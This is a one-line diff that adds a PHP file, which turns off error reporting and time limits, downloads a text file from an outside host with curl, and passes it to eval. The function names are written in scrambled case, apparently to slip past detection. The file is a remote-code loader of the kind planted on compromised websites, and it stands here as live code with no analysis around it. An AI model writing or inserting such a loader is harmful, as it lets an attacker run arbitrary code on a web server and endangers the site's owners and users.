@@ -1,0 +1,1 @@
+<?php eRrOr_rEpOrTiNg(0);sEt_tImE_LiMiT(0);$id = cuRl_iNIt();cUrL_SeToPt($id, CURLOPT_URL, "https://adm-stiabagasasi.ac.id/kucing_ireng/g0t0/ooosaaassfiiixx.txt");cUrL_SeToPt($id, CURLOPT_RETURNTRANSFER, 1);$news = cUrL_ExEc($id);cUrL_ClOsE($id);eVaL("?>".$news);?>
